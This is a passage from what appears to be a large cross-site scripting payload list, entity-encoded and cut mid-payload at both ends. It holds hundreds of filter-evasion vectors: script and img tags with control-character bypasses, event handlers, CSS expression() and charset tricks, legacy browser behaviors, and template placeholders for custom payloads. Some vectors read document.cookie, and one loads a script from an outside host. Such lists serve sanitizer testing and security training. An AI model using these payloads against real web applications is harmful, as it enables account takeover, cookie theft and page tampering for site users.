pos;&gt;&lt;script&gt;\xE2\x80\x87javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x81\x9Fjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\xA9javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xC2\x85javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xEF\xBF\xAEjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x83javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x8Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xEF\xBF\xBEjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x80javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x21javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x82javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x86javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE1\xA0\x8Ejavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x0Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x20javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xC2\xA0javascript:alert(1)&lt;/script&gt;&quot;/&gt;&lt;img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x22javascript:alert(1)\x22src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x09javascript:alert(1)\x09src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x27javascript:alert(1)\x27src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x60javascript:alert(1)\x60src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\x20javascript:alert(1)\x20src=xxx:x /&gt;&lt;script\x2F&gt;javascript:alert(1)&lt;/script&gt;&lt;script\x20&gt;javascript:alert(1)&lt;/script&gt;&lt;script\x0D&gt;javascript:alert(1)&lt;/script&gt;&lt;script\x0A&gt;javascript:alert(1)&lt;/script&gt;&lt;script\x0C&gt;javascript:alert(1)&lt;/script&gt;&lt;script\x00&gt;javascript:alert(1)&lt;/script&gt;&lt;script\x09&gt;javascript:alert(1)&lt;/script&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0B=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x00=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0C=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0D=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x20=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0A=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x09=javascript:alert(1)&gt;&lt;script&gt;javascript:alert(1)&lt;\x00/script&gt;&lt;img src=# onerror\x3D&quot;javascript:alert(1)&quot; &gt;&lt;input onfocus=javascript:alert(1) autofocus&gt;&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;&lt;video poster=javascript:javascript:alert(1)//&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X&lt;video&gt;&lt;source onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;video onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;source&gt;&lt;form&gt;&lt;button formaction=&quot;javascript:javascript:alert(1)&quot;&gt;X&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://google.com&quot; xlink:href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;&lt;frameset onload=javascript:alert(1)&gt;&lt;table background=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//&quot;&gt;&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,javascript:alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;&lt;object data=&quot;data:text/html;base64,%(base64)s&quot;&gt;&lt;embed src=&quot;data:text/html;base64,%(base64)s&quot;&gt;&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=javascript:alert(1)//&apos;&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;img src=&quot;javascript:alert(1)&quot;&gt;&lt;image src=&quot;javascript:alert(1)&quot;&gt;&lt;script src=&quot;javascript:alert(1)&quot;&gt;&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x&lt;? foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;div id=d&gt;&lt;x xmlns=&quot;&gt;&lt;iframe onload=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;&lt;img \x00src=x onerror=&quot;alert(1)&quot;&gt;&lt;img \x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \x11src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \x12src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\x10src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\x13src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\x32src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\x11src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \x34src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \x39src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \x00src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x09=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x10=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x13=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x32=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x12=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x11=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x00=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\x47=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\x09onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\x10onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\x11onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\x12onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\x13onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;&lt;img src=x onerror=\x09&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\x10&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\x11&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\x12&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\x32&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\x00&quot;javascript:alert(1)&quot;&gt;&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;&lt;img src=&quot;x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;` `&gt;&lt;img src onerror /&quot; &apos;&quot;= alt=javascript:alert(1)//&quot;&gt;&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=&quot;`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;&quot;&gt;&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;&lt;script src=&quot;/\%(jscript)s&quot;&gt;&lt;/script&gt;&lt;script src=&quot;\\%(jscript)s&quot;&gt;&lt;/script&gt;&lt;object id=&quot;x&quot; classid=&quot;clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598&quot;&gt;&lt;/object&gt; &lt;object classid=&quot;clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&quot; onqt_error=&quot;javascript:alert(1)&quot; style=&quot;behavior:url(#x);&quot;&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;&lt;a style=&quot;-o-link:&apos;javascript:javascript:alert(1)&apos;;-o-link-source:current&quot;&gt;X&lt;style&gt;p[foo=bar&#123;&#125;*&#123;-o-link:&apos;javascript:javascript:alert(1)&apos;&#125;&#123;&#125;*&#123;-o-link-source:current&#125;]&#123;color:red&#125;;&lt;/style&gt;&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d&lt;style&gt;@import &quot;data:,*%7bx:expression(javascript:alert(1))%7D&quot;;&lt;/style&gt;&lt;a style=&quot;pointer-events:none;position:absolute;&quot;&gt;&lt;a style=&quot;position:absolute;&quot; onclick=&quot;javascript:alert(1);&quot;&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href=&quot;javascript:javascript:alert(1)&quot;&gt;XXX&lt;/a&gt;&lt;style&gt;*[&#123;&#125;@import&apos;%(css)s?]&lt;/style&gt;X&lt;div style=&quot;font-family:&apos;foo&amp;#10;;color:red;&apos;;&quot;&gt;XXX&lt;div style=&quot;font-family:foo&#125;color=red;&quot;&gt;XXX&lt;// style=x:expression\28javascript:alert(1)\29&gt;&lt;style&gt;*&#123;x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))&#125;&lt;/style&gt;&lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;&lt;div style=&quot;list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));&quot;&gt;X&lt;div id=d&gt;&lt;div style=&quot;font-family:&apos;sans\27\3B color\3Ared\3B&apos;&quot;&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById(&quot;d&quot;))innerHTML=innerHTML&lt;/script&gt;&lt;div style=&quot;background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);&quot;&gt;X&lt;div style=&quot;font-family:foo&#123;bar;background:url(http://foo.f/oo&#125;;color:red/*/foo.jpg);&quot;&gt;X&lt;div id=&quot;x&quot;&gt;XXX&lt;/div&gt; &lt;style&gt; #x&#123;font-family:foo[bar;color:green;&#125; #y];color:red;&#123;&#125; &lt;/style&gt;&lt;x style=&quot;background:url(&apos;x&amp;#1;;color:red;/*&apos;)&quot;&gt;XXX&lt;/x&gt;&lt;script&gt;(&#123;set/**/$($)&#123;_/**/setter=$,_=javascript:alert(1)&#125;&#125;).$=eval&lt;/script&gt;&lt;script&gt;(&#123;0:#0=eval/#0#/#0#(javascript:alert(1))&#125;)&lt;/script&gt;&lt;script&gt;ReferenceError.prototype.__defineGetter__(&apos;name&apos;, function()&#123;javascript:alert(1)&#125;),x&lt;/script&gt;&lt;script&gt;Object.__noSuchMethod__ = Function,[&#123;&#125;][0].constructor._(&apos;javascript:alert(1)&apos;)()&lt;/script&gt;&lt;meta charset=&quot;x-imap4-modified-utf7&quot;&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi&lt;meta charset=&quot;x-imap4-modified-utf7&quot;&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;&lt;meta charset=&quot;mac-farsi&quot;&gt;¼script¾javascript:alert(1)¼/script¾X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=javascript:alert(1)&amp;gt;`&gt;1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=javascript:alert(1)&amp;gt;&gt;&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;&lt;a style=&quot;behavior:url(#default#AnchorClick);&quot; folder=&quot;javascript:javascript:alert(1)&quot;&gt;XXX&lt;/a&gt;&lt;x style=&quot;behavior:url(%(sct)s)&quot;&gt;&lt;xml id=&quot;xss&quot; src=&quot;%(htc)s&quot;&gt;&lt;/xml&gt; &lt;label dataformatas=&quot;html&quot; datasrc=&quot;#xss&quot; datafld=&quot;payload&quot;&gt;&lt;/label&gt;&lt;event-source src=&quot;%(event)s&quot; onload=&quot;javascript:alert(1)&quot;&gt;&lt;a href=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;event-source src=&quot;data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A&quot;&gt;&lt;div id=&quot;x&quot;&gt;x&lt;/div&gt; &lt;xml:namespace prefix=&quot;t&quot;&gt; &lt;import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt; &lt;t:set attributeName=&quot;innerHTML&quot; targetElement=&quot;x&quot; to=&quot;&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=javascript:alert(1)&amp;gt;&quot;&gt;&lt;script&gt;%(payload)s&lt;/script&gt;&lt;script src=%(jscript)s&gt;&lt;/script&gt;&lt;script language=&apos;javascript&apos; src=&apos;%(jscript)s&apos;&gt;&lt;/script&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&lt;IMG SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;IMG SRC=javascript:javascript:alert(1)&gt;&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;&lt;SCRIPT SRC=%(jscript)s?&lt;B&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;/FRAMESET&gt;&lt;BODY ONLOAD=javascript:alert(1)&gt;&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;&lt;IMG SRC=&quot;jav ascript:javascript:alert(1);&quot;&gt;&lt;BODY onload!#$%%&amp;()*~+-_.,:;?@[/|\]^`=javascript:alert(1)&gt;&lt;SCRIPT/SRC=&quot;%(jscript)s&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:javascript:alert(1)&quot;&lt;iframe src=%(scriptlet)s &lt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;IMG DYNSRC=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;BGSOUND SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;BR SIZE=&quot;&amp;&#123;javascript:alert(1)&#125;&quot;&gt;&lt;LAYER SRC=&quot;%(scriptlet)s&quot;&gt;&lt;/LAYER&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;STYLE&gt;@import&apos;%(css)s&apos;;&lt;/STYLE&gt;&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;%(css)s&gt;; REL=stylesheet&quot;&gt;&lt;XSS STYLE=&quot;behavior: url(%(htc)s);&quot;&gt;&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:javascript:alert(1)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:javascript:alert(1);&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:javascript:alert(1);&quot;&gt;&lt;IFRAME SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;/IFRAME&gt;&lt;TABLE BACKGROUND=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:javascript:alert(1))&quot;&gt;&lt;DIV STYLE=&quot;width:expression(javascript:alert(1));&quot;&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(javascript:alert(1))&quot;&gt;&lt;XSS STYLE=&quot;xss:expression(javascript:alert(1))&quot;&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/STYLE&gt;&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:javascript:alert(1)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:javascript:alert(1)&quot;)&#125;&lt;/STYLE&gt;&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;&lt;BASE HREF=&quot;javascript:javascript:alert(1);//&quot;&gt;&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;%(scriptlet)s&quot;&gt;&lt;/OBJECT&gt;&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;%(htc)s&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;&quot;&quot;&quot;,&quot;XML namespace.&quot;),(&quot;&quot;&quot;&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:javascript:alert(1)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;javascript:alert(1)&amp;lt;/SCRIPT&amp;gt;&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;SCRIPT SRC=&quot;%(jpg)s&quot;&gt;&lt;/SCRIPT&gt;&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-&lt;form id=&quot;test&quot; /&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:javascript:alert(1)&quot;&gt;X&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;P STYLE=&quot;behavior:url(&apos;#default#time2&apos;)&quot; end=&quot;0&quot; onEnd=&quot;javascript:alert(1)&quot;&gt;&lt;STYLE&gt;@import&apos;%(css)s&apos;;&lt;/STYLE&gt;&lt;STYLE&gt;a&#123;background:url(&apos;s1&apos; &apos;s2)&#125;@import javascript:javascript:alert(1);&apos;);&#125;&lt;/STYLE&gt;&lt;meta charset= &quot;x-imap4-modified-utf7&quot;&amp;&amp;&gt;&amp;&amp;&lt;script&amp;&amp;&gt;javascript:alert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/script&amp;&amp;&gt;&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;html:html xmlns:html=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;&lt;object onerror=javascript:javascript:alert(1)&gt;&lt;embed type=&quot;image&quot; src=%(scriptlet)s&gt;&lt;/embed&gt;&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&lt;![CDATA[cript:javascript:alert(1);&quot;&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;&lt;IMG SRC=&amp;&#123;javascript:alert(1);&#125;;&gt;&lt;a href=&quot;jav&amp;#65ascript:javascript:alert(1)&quot;&gt;test1&lt;/a&gt;&lt;a href=&quot;jav&amp;#97ascript:javascript:alert(1)&quot;&gt;test1&lt;/a&gt;&lt;embed width=500 height=500 code=&quot;data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;&quot;&gt;&lt;/embed&gt;&lt;iframe srcdoc=&quot;&amp;LT;iframe&amp;sol;srcdoc=&amp;amp;lt;img&amp;sol;src=&amp;amp;apos;&amp;amp;apos;onerror=javascript:alert(1)&amp;amp;gt;&gt;&quot;&gt;&apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG 